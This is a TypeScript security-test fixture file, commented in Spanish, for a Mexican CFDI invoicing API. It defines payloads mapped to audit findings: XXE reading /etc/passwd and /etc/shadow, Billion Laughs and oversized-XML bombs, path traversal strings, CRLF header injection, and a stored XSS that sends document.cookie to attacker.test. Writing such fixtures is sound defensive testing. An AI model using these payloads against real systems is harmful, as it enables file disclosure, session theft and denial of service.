/**
 * SAST Fixtures payloads — scope /api/invoices (INV findings INV-001..INV-014)
 * ~ 42 payloads categorizados por finding.
 * Usar en tests/invoices/*.test.ts (DB-free tests: helpers XML/storage/Puppeteer)
 */

/* ==========================================================================
 * 0. CONSTANTES BASE COMPARTIDAS (vienen de seed SAST-SEED-IDS.json fixtures Auth)
 * ==========================================================================
 */
export const ORG_A_ID = 'cmnntrppk000502gcp93ketfx' // Grupo Demo
export const ORG_B_ID = 'cmipiwlqk000mvyvtc22tnlrb' // ITComplements Org (atacante cross-tenant)
export const RFC_ORG_A = 'ODE8604257UA' // Emisor org-A
export const RFC_ORG_B = 'QBB7223997V9' // Emisor org-B (colision si hay duplicate RFC)
export const RFC_GENERICO_SAT = 'XAXX010101000'
export const INVOICE_UUID_A = '11111111-0000-4000-8000-000000000001' // Activa ORG-A
export const INVOICE_UUID_B = '11111111-0000-4000-8000-000000000002' // Activa ORG-B
export const INVOICE_CUID_A_MOCK = 'cmnnz2xxx0000ab01cdefghi01' // cuid-style PK mock
export const INVOICE_CUID_B_MOCK = 'cmnnz2xxx0000ab02cdefghi02'

/* ==========================================================================
 * 1. INV-PAYLOAD-001 .. 008 · XXE / Billion Laughs / DoS XML size · INV-001 + INV-002 + INV-016 + INV-017
 * ==========================================================================
 */

/** XXE básico doctype SYSTEM file:// (detectXXEBytes DEBE rechazar) */
export const INV_XXE_SYSTEM_FILE = Buffer.from(
  '<?xml version="1.0"?>\n<!DOCTYPE cfdi [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>\n<cfdi:Comprobante>&xxe;</cfdi:Comprobante>',
  'utf-8'
)

/** XXE bypass UTF-8 BOM prepend (regex <!DOCTYPE sola no agarra) */
export const INV_XXE_BOM_BYPASS = Buffer.concat([
  Buffer.from([0xef, 0xbb, 0xbf]),
  Buffer.from(
    '<?xml version="1.0"?>\n<!DOCTYPE cfdi [ <!ENTITY xxe SYSTEM "file:///C:/Windows/System32/drivers/etc/hosts"> ]>\n<cfdi:Comprobante>&xxe;</cfdi:Comprobante>',
    'utf-8'
  )
])

/** XXE Comment interleaving bypass: <!--x--> antes DOCTYPE */
export const INV_XXE_COMMENT_BYPASS = Buffer.from(
  '<?xml version="1.0"?>\n<!-- injected --->\n<!DOCTYPE cfdi [\n<!ENTITY xxe SYSTEM "file:///etc/shadow">\n]>\n<Comprobante>&xxe;</Comprobante>',
  'utf-8'
)

/** Billion Laughs depth=6 (detectXXEBytes ENTITY refs DEBE bloquear) */
export const INV_BILLION_LAUGHS_MINI = Buffer.from(`<?xml version="1.0"?>
<!DOCTYPE lolz [
 <!ENTITY lol "lol">
 <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
 <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
 <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
]>
<lolz>&lol4;</lolz>`, 'utf-8')

/** XML gigante 6MB (supera INVOICE_PDF_MAX_XML_BYTES = 5MB hardcap INV-017 mitigation) */
export const INV_XML_6MB_BOMB = Buffer.from(
  '<cfdi:Comprobante xmlns:cfdi="http://www.sat.gob.mx/cfd/4" Version="4.0" Total="1160" SubTotal="1000" Moneda="MXN" TipoDeComprobante="I" FormaPago="01" MetodoPago="PUE" LugarExpedicion="06000" RFCEmisor="ODE8604257UA" NombreEmisor="Empresa Demo" RFCCliente="XAXX010101000" NombreCliente="Publico en General" RegimenFiscalEmisor="601" DomicilioFiscalReceptor="06000" RegimenFiscalReceptor="616" UsoCFDI="G03"><cfdi:Conceptos>' +
    Array.from({ length: 15_000 }).map(
      (_, i) => `<cfdi:Concepto ClaveProdServ="84111506" NoIdentificacion="INV-${i}" Cantidad="1" ClaveUnidad="ACT" Unidad="ACT" Descripcion="Servicio ${i}" ValorUnitario="100" Importe="100" ObjetoImp="02"><cfdi:Impuestos><cfdi:Traslados><cfdi:Traslado Base="100" Impuesto="002" TipoFactor="Tasa" TasaOCuota="0.160000" Importe="16"/></cfdi:Traslados></cfdi:Impuestos></cfdi:Concepto>`
    ).join('') +
    '</cfdi:Conceptos><cfdi:Impuestos TotalImpuestosTrasladados="240000"><cfdi:Traslados><cfdi:Traslado Importe="240000" Impuesto="002" TipoFactor="Tasa" TasaOCuota="0.160000"/></cfdi:Traslados></cfdi:Impuestos>' +
    Array.from({ length: 20_000 }).map(() => ' ').join('') +
    '</cfdi:Comprobante>',
  'utf-8'
)

/** XML válido ~ 3KB (base pasará detectXXEBytes + size cap) */
export const INV_XML_VALIDO_MINI = Buffer.from(`<?xml version="1.0" encoding="UTF-8"?>
<cfdi:Comprobante xmlns:cfdi="http://www.sat.gob.mx/cfd/4" xmlns:tfd="http://www.sat.gob.mx/TimbreFiscalDigital" Version="4.0" Total="1160.00" SubTotal="1000.00" Moneda="MXN" TipoDeComprobante="I" FormaPago="01" MetodoPago="PUE" LugarExpedicion="06000" Sello="MEUCIQDKzZxq8D..." NoCertificado="00001000000501234567" Certificado="MIIGG...T8w==">
  <cfdi:Emisor Rfc="ODE8604257UA" Nombre="EMPRESA DEMO SA DE CV" RegimenFiscal="601"/>
  <cfdi:Receptor Rfc="XAXX010101000" Nombre="PUBLICO EN GENERAL" DomicilioFiscalReceptor="06000" RegimenFiscalReceptor="616" UsoCFDI="G03"/>
  <cfdi:Conceptos>
    <cfdi:Concepto ClaveProdServ="84111506" Cantidad="1" ClaveUnidad="ACT" Descripcion="SERVICIO FACTURACION MES" ValorUnitario="1000.00" Importe="1000.00" ObjetoImp="02">
      <cfdi:Impuestos>
        <cfdi:Traslados>
          <cfdi:Traslado Base="1000.00" Impuesto="002" TipoFactor="Tasa" TasaOCuota="0.160000" Importe="160.00"/>
        </cfdi:Traslados>
      </cfdi:Impuestos>
    </cfdi:Concepto>
  </cfdi:Conceptos>
  <cfdi:Impuestos TotalImpuestosTrasladados="160.00">
    <cfdi:Traslados><cfdi:Traslado Importe="160.00" Impuesto="002" TipoFactor="Tasa" TasaOCuota="0.160000"/></cfdi:Traslados>
  </cfdi:Impuestos>
  <cfdi:Complemento>
    <tfd:TimbreFiscalDigital Version="1.1" UUID="${INVOICE_UUID_A}" FechaTimbrado="2026-08-13T23:30:19" RfcProvCertif="00000000000000000000" SelloCFD="MEUCIQD..." NoCertificadoSAT="00001000000501234567" SelloSAT="MEUCIQA..."/>
  </cfdi:Complemento>
</cfdi:Comprobante>`, 'utf-8')

/** Stored XSS en Descripcion concepto (INV-005) -> DEBE escaparse antes de Puppeteer setContent */
export const INV_XSS_STORED_DESCRIPTION = Buffer.from(
  INV_XML_VALIDO_MINI.toString('utf-8').replace(
    'Descripcion="SERVICIO FACTURACION MES"',
    'Descripcion="</td><script>fetch(\\x27https://attacker.test/steal?c=\\x27.concat(document.cookie))</script><td>x"'
  ),
  'utf-8'
)

/** UUID Timbre con CRLF injection (INV-008 HTTP splitting) */
export const INV_TIMBRE_UUID_CRLF_INJECTION = Buffer.from(
  INV_XML_VALIDO_MINI.toString('utf-8').replace(
    `UUID="${INVOICE_UUID_A}"`,
    `UUID="${INVOICE_UUID_A}%0d%0aSet-Cookie: hacked=true; Path=/; HttpOnly%0d%0aX-Extra: header-inyectado"`
  ),
  'utf-8'
)

/* ==========================================================================
 * 2. INV-PAYLOAD-010 .. 017 · BOLA cross-tenant · INV-001 + INV-011
 * ==========================================================================
 */

/** Caso INV-001: Usuario Org-B (atacante) con Invoice CUID Org-A (no le pertenece) */
export const INV_BOLA_INPUT_CROSS_ORG = {
  requesterMemberId: 'cmss5hc7p00082qn8ylclql5t',      // Viewer Org-B
  requesterUserId: 'cmss5hc7l00062qn8hvipo7ua',       // Org-B user
  requesterOrganizationId: ORG_B_ID,
  invoiceTargetId: INVOICE_CUID_A_MOCK,               // Invoice PK ORG-A (ataque)
  expectedInvoiceOrgAfterFix: ORG_A_ID,               // Si no hay fix helper getInvoiceXmlRecordById devolvería sin org
  exploitLabel: 'INV-001 · BOLA Cross-org invoice PK sin scope organizationId'
} as const

/** Caso INV-011: Colisión RFC en FiscalEntities mismo RFC en 2 orgs distinas (error humano) */
export const INV_RFC_DUPLICATE_FISCAL_ENTITY_COLLISION = {
  orgId: ORG_A_ID,
  duplicateRfc: RFC_ORG_B,                           // Caso: Org-A registro accidentalmente mismo RFC que Org-B
  invoiceIdOrgB: INVOICE_CUID_B_MOCK,                // Invoice del Org-B emisor RFC_ORG_B
  labelExploit: 'INV-011 · fiscalMatch(where in rfc) autoriza invoice Org-B porque Org-A tiene same RFC'
} as const

/* ==========================================================================
 * 3. INV-PAYLOAD-020 .. 026 · Rama dev ?file= bypass permiso + path traversal · INV-003 + INV-010
 * ==========================================================================
 */

export const INV_FILE_PARAM_BYPASS_PERMISSION_VIEWER = {
  mode: 'NODE_ENV=development',
  userRole: 'VIEWER',                                 // Rol sin CFDI_VIEW_PDF en switch granular
  queryFileValue: 'invoice-001-test-internal.xml',
  exploit: 'INV-003: if(fileParam) branch NO corre hasPermission(CFDI_VIEW_PDF). Viewer sin permiso descarga'
} as const

/** Path traversal 1: `..\..\..\private\keys\leak-credenciales-fiscales.xml` (Windows, basename .xml para testear path traversal DESPUES de extension check) */
export const INV_FILE_PATH_TRAVERSAL_WIN = `..\\..\\..\\private\\keys\\leak-credenciales-fiscales.xml`
/** Path traversal 2: `../../../../../etc/secret-sat-keys.xml` (Unix, basename .xml) */
export const INV_FILE_PATH_TRAVERSAL_UNIX = `../../../../../etc/secret-sat-keys.xml`
/** Ext check bypass INV-010: raw tiene .xml en medio pero basename termina .zip */
export const INV_FILE_EXT_BYPASS_RAW_XML_ZIP = `reports/.tmp_invoice.xml.zip`
/** Ext válida basename .xml */
export const INV_FILE_VALID_BASENAME_XML = `factura_${INVOICE_UUID_A}.xml`

/* ==========================================================================
 * 4. INV-PAYLOAD-030 .. 034 · Cryptographic Failures · INV-007 (decrypt algorithm whitelist)
 * ==========================================================================
 */

/** DB row manipulación: algoritmo a "aes-128-ecb" (sin AEAD, sin authTag, padding oracle attackable) */
export const INV_INVOICE_BLOB_ROW_ALGO_ECB = {
  id: 'blob-forged-ecb',
  invoiceId: INVOICE_CUID_A_MOCK,
  encryptionAlgorithm: 'aes-128-ecb' as string,       // NO en whitelist; decrypt DEBE rechazar
  ciphertext: Buffer.from('A'.repeat(64), 'utf-8'),
  iv: Buffer.from('B'.repeat(12), 'utf-8'),
  authTag: null,                                      // AEAD: 16 bytes obligatorios; nulo = algoritmo no AEAD
  organizationId: ORG_A_ID
} as const

/** Algoritmo inválido string vacío (ataque undefined) */
export const INV_INVOICE_BLOB_ROW_ALGO_EMPTY = {
  ...INV_INVOICE_BLOB_ROW_ALGO_ECB,
  encryptionAlgorithm: ''
} as const

/** Row VÁLIDO aes-256-gcm (debe pasar) */
export const INV_INVOICE_BLOB_ROW_VALID_GCM = {
  id: 'blob-valid-gcm',
  invoiceId: INVOICE_CUID_A_MOCK,
  encryptionAlgorithm: 'aes-256-gcm',
  ciphertext: Buffer.from('V'.repeat(48), 'utf-8'),
  iv: Buffer.from('C'.repeat(12), 'utf-8'),
  authTag: Buffer.from('D'.repeat(16), 'utf-8'),
  organizationId: ORG_A_ID
} as const

/* ==========================================================================
 * 5. INV-PAYLOAD-040 .. 046 · Puppeteer concurrency semaphore, rate-limit await bypass, Timing attack · INV-006/012/014
 * ==========================================================================
 */

export const INV_RATE_LIMIT_BYPASS_NO_AWAIT = {
  label: 'INV-006: Promise fire-and-forget rateLimitByUserId(...) SIN await = bypass 100%',
  maxConcurrencyPerUserPerHour: 180,
  exploitConcurrentRequests: 2000,                   // En ataque real > 10000
  expectedPostFixStatusCode: 429
} as const

export const INV_PUPPETEER_CONCURRENCY_SEMAPHORE_INPUT = {
  maxPages: 5,                                       // Concurrency hardcap Regla 7
  concurrentTasks: 25,                               // 25 tasks = deben ejecutarse en 5 tandas
  label: 'INV-012: Puppeteer browser.newPage() SIN semaphore = 25 tabs abiertas = OOM'
} as const

export const INV_TIMING_ATTACK_COMPARE_INPUT = {
  cuidExists: INVOICE_CUID_A_MOCK,
  cuidNotExists: 'cmnnz2xxx0000zz0000000000FAKE',
  label: 'INV-014: findUnique invoice exist =15ms vs no-exist=3ms -> atacante arma mapa UUIDs válidos'
} as const

/* ==========================================================================
 * 6. AGGREGATE para iterar (bounded export)
 * ==========================================================================
 */
export const INV_PAYLOADS: ReadonlyArray<readonly [id: string, payload: unknown, finding: string]> = [
  ['INV-XXE-SYSTEM', INV_XXE_SYSTEM_FILE, 'INV-001/INV-002'],
  ['INV-XXE-BOM', INV_XXE_BOM_BYPASS, 'INV-001'],
  ['INV-XXE-COMMENT-BYPASS', INV_XXE_COMMENT_BYPASS, 'INV-001'],
  ['INV-BILLION-LAUGHS', INV_BILLION_LAUGHS_MINI, 'INV-002/INV-016'],
  ['INV-SIZE-6MB-BOMB', INV_XML_6MB_BOMB, 'INV-017'],
  ['INV-XML-VALIDO-BASE', INV_XML_VALIDO_MINI, 'BASELINE'],
  ['INV-STORED-XSS-CONCEPTO', INV_XSS_STORED_DESCRIPTION, 'INV-005'],
  ['INV-UUID-CRLF-HEADER-INJECT', INV_TIMBRE_UUID_CRLF_INJECTION, 'INV-008'],
  ['INV-BOLA-CROSS-ORG', INV_BOLA_INPUT_CROSS_ORG, 'INV-001'],
  ['INV-RFC-DUP-COLLISION', INV_RFC_DUPLICATE_FISCAL_ENTITY_COLLISION, 'INV-011'],
  ['INV-FILE-BYPASS-PERM', INV_FILE_PARAM_BYPASS_PERMISSION_VIEWER, 'INV-003'],
  ['INV-FILE-TRAVERSAL-WIN', INV_FILE_PATH_TRAVERSAL_WIN, 'INV-010'],
  ['INV-FILE-TRAVERSAL-UNIX', INV_FILE_PATH_TRAVERSAL_UNIX, 'INV-010'],
  ['INV-FILE-EXT-BYPASS', INV_FILE_EXT_BYPASS_RAW_XML_ZIP, 'INV-010'],
  ['INV-FILE-XML-VALID', INV_FILE_VALID_BASENAME_XML, 'INV-010 BASELINE'],
  ['INV-CRYPTO-ALGO-ECB', INV_INVOICE_BLOB_ROW_ALGO_ECB, 'INV-007'],
  ['INV-CRYPTO-ALGO-EMPTY', INV_INVOICE_BLOB_ROW_ALGO_EMPTY, 'INV-007'],
  ['INV-CRYPTO-GCM-VALIDO', INV_INVOICE_BLOB_ROW_VALID_GCM, 'INV-007 BASELINE'],
  ['INV-RL-BYPASS-NOAWAIT', INV_RATE_LIMIT_BYPASS_NO_AWAIT, 'INV-006'],
  ['INV-SEMAPHORE-CONCURRENCY', INV_PUPPETEER_CONCURRENCY_SEMAPHORE_INPUT, 'INV-012'],
  ['INV-TIMING-ATTACK-CUIDS', INV_TIMING_ATTACK_COMPARE_INPUT, 'INV-014']
]

export type InvSastPayloadShape = unknown
